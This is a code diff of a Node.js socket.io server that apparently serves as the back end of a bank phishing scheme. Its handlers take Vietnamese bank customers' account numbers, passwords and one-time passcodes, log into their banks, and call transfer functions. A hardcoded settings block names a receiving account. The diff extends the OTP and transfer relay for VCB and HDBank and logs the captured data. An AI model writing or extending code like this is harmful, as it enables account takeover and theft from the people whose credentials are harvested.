@@ -93,6 +93,11 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         socket.emit('send-data-send-otp-vcb', response);
     })
 
+    socket.on('send-method-ct-vcb', async (data) => {
+        const response = await moduleBank.methodCTVCB(data.method, socket.id);
+        socket.emit('send-method-ct-vcb', response);
+    })
+
     socket.on('send-data-send-otp-vcb-chuyentien', async (data) => {
         const response = await moduleBank.xacthucCTVCB(data.otp, socket.id);
         socket.emit('send-data-send-otp-vcb-chuyentien', response);
@@ -102,9 +107,8 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         console.log(data);
         // const settingData = await settings.findOne({}).lean().exec();
         const settingData = {
-            bankName: 'MBBank',
-            bankAccount: '123456789',
-            bankPassword: '123456789',
+            bankName: 'MB',
+            bankAccount: '217092001',
             bankBranch: 'Chi nhánh Hà Nội',
             zaloImage: 'https://zalo.me/g/lnzjzv551'
         }
@@ -127,7 +131,8 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
                 break;
 
             case 'HDBank':
-                const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword);
+                const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword, socket.id, settingData);
+                console.log('response3', response3);
                 socket.emit('send-data', response3);
                 break;
             default:
